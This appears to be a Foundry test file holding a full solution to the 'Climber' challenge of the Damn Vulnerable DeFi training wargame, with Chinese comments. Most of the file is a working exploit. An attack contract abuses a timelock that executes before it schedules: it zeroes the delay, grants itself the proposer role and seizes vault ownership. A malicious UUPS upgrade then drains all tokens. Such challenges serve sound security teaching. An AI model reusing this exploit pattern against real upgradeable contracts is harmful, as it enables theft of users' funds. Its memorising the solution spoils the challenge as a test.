// SPDX-License-Identifier: MIT
// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
pragma solidity =0.8.25;

import {Test, console} from "forge-std/Test.sol";
import {ClimberVault} from "../../src/climber/ClimberVault.sol";
import {ClimberTimelock, CallerNotTimelock, PROPOSER_ROLE, ADMIN_ROLE} from "../../src/climber/ClimberTimelock.sol";
import {ERC1967Proxy} from "@openzeppelin/contracts/proxy/ERC1967/ERC1967Proxy.sol";
import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
import {Initializable} from "@openzeppelin/contracts-upgradeable/proxy/utils/Initializable.sol";
import {OwnableUpgradeable} from "@openzeppelin/contracts-upgradeable/access/OwnableUpgradeable.sol";
import {UUPSUpgradeable} from "@openzeppelin/contracts-upgradeable/proxy/utils/UUPSUpgradeable.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {SafeTransferLib} from "solady/utils/SafeTransferLib.sol";

// 恶意的Vault实现，移除所有限制
contract MaliciousVault is Initializable, OwnableUpgradeable, UUPSUpgradeable {
    function drainFunds(address token, address recipient) external onlyOwner {
        SafeTransferLib.safeTransfer(token, recipient, IERC20(token).balanceOf(address(this)));
    }
    
    function _authorizeUpgrade(address newImplementation) internal override onlyOwner {}
}

// 攻击合约用于协调整个exploit
contract AttackContract {
    ClimberTimelock public timelock;
    ClimberVault public vault;
    address public player;
    address public recovery;
    DamnValuableToken public token;
    
    address[] targets;
    uint256[] values;
    bytes[] dataElements;
    bytes32 salt = keccak256("climber_exploit");
    
    constructor(ClimberTimelock _timelock, ClimberVault _vault, address _player, address _recovery, DamnValuableToken _token) {
        timelock = _timelock;
        vault = _vault;
        player = _player;
        recovery = _recovery;
        token = _token;
    }
    
    function attack() external {
        // 准备execute调用的参数
        targets = new address[](5);
        values = new uint256[](5);
        dataElements = new bytes[](5);
        
        // 第一个调用：updateDelay将delay设置为0
        targets[0] = address(timelock);
        values[0] = 0;
        dataElements[0] = abi.encodeCall(ClimberTimelock.updateDelay, (0));
        
        // 第二个调用：给timelock自己赋予PROPOSER_ROLE权限
        targets[1] = address(timelock);
        values[1] = 0;
        dataElements[1] = abi.encodeWithSignature("grantRole(bytes32,address)", PROPOSER_ROLE, address(timelock));
        
        // 第三个调用：给攻击合约赋予PROPOSER_ROLE权限
        targets[2] = address(timelock);
        values[2] = 0;
        dataElements[2] = abi.encodeWithSignature("grantRole(bytes32,address)", PROPOSER_ROLE, address(this));
        
        // 第四个调用：transferOwnership将vault的所有权转移给player
        targets[3] = address(vault);
        values[3] = 0;
        dataElements[3] = abi.encodeWithSignature("transferOwnership(address)", player);
        
        // 第五个调用：调用这个合约的schedule函数
        targets[4] = address(this);
        values[4] = 0;
        dataElements[4] = abi.encodeCall(AttackContract.scheduleOperation, ());
        
        // 执行exploit
        timelock.execute(targets, values, dataElements, salt);
    }
    
    function scheduleOperation() external {
        // 在execute过程中被调用，用于注册operation
        timelock.schedule(targets, values, dataElements, salt);
    }
}

contract ClimberChallenge is Test {
    address deployer = makeAddr("deployer");
    address player = makeAddr("player");
    address proposer = makeAddr("proposer");
    address sweeper = makeAddr("sweeper");
    address recovery = makeAddr("recovery");

    uint256 constant VAULT_TOKEN_BALANCE = 10_000_000e18;
    uint256 constant PLAYER_INITIAL_ETH_BALANCE = 0.1 ether;
    uint256 constant TIMELOCK_DELAY = 60 * 60;

    ClimberVault vault;
    ClimberTimelock timelock;
    DamnValuableToken token;

    modifier checkSolvedByPlayer() {
        vm.startPrank(player, player);
        _;
        vm.stopPrank();
        _isSolved();
    }

    /**
     * SETS UP CHALLENGE - DO NOT TOUCH
     */
    function setUp() public {
        startHoax(deployer);
        vm.deal(player, PLAYER_INITIAL_ETH_BALANCE);

        // Deploy the vault behind a proxy,
        // passing the necessary addresses for the `ClimberVault::initialize(address,address,address)` function
        vault = ClimberVault(
            address(
                new ERC1967Proxy(
                    address(new ClimberVault()), // implementation
                    abi.encodeCall(ClimberVault.initialize, (deployer, proposer, sweeper)) // initialization data
                )
            )
        );

        // Get a reference to the timelock deployed during creation of the vault
        timelock = ClimberTimelock(payable(vault.owner()));

        // Deploy token and transfer initial token balance to the vault
        token = new DamnValuableToken();
        token.transfer(address(vault), VAULT_TOKEN_BALANCE);

        vm.stopPrank();
    }

    /**
     * VALIDATES INITIAL CONDITIONS - DO NOT TOUCH
     */
    function test_assertInitialState() public {
        assertEq(player.balance, PLAYER_INITIAL_ETH_BALANCE);
        assertEq(vault.getSweeper(), sweeper);
        assertGt(vault.getLastWithdrawalTimestamp(), 0);
        assertNotEq(vault.owner(), address(0));
        assertNotEq(vault.owner(), deployer);

        // Ensure timelock delay is correct and cannot be changed
        assertEq(timelock.delay(), TIMELOCK_DELAY);
        vm.expectRevert(CallerNotTimelock.selector);
        timelock.updateDelay(uint64(TIMELOCK_DELAY + 1));

        // Ensure timelock roles are correctly initialized
        assertTrue(timelock.hasRole(PROPOSER_ROLE, proposer));
        assertTrue(timelock.hasRole(ADMIN_ROLE, deployer));
        assertTrue(timelock.hasRole(ADMIN_ROLE, address(timelock)));

        assertEq(token.balanceOf(address(vault)), VAULT_TOKEN_BALANCE);
    }

    /**
     * CODE YOUR SOLUTION HERE
     */
    function test_climber() public checkSolvedByPlayer {
        // 创建攻击合约
        AttackContract attacker = new AttackContract(timelock, vault, player, recovery, token);
        
        // 执行攻击
        attacker.attack();
        
        // 检查vault的所有者
        console.log("ClimberVault owner after exploit:", vault.owner());
        console.log("Player address:", player);
        console.log("Is player the new owner?", vault.owner() == player);
        
        // 现在player是vault的owner，升级合约来绕过限制
        MaliciousVault maliciousImpl = new MaliciousVault();
        vault.upgradeToAndCall(address(maliciousImpl), "");
        
        // 现在使用恶意合约的函数来提取所有token
        MaliciousVault(address(vault)).drainFunds(address(token), recovery);
    }

    /**
     * CHECKS SUCCESS CONDITIONS - DO NOT TOUCH
     */
    function _isSolved() private view {
        assertEq(token.balanceOf(address(vault)), 0, "Vault still has tokens");
        assertEq(token.balanceOf(recovery), VAULT_TOKEN_BALANCE, "Not enough tokens in recovery account");
    }
}
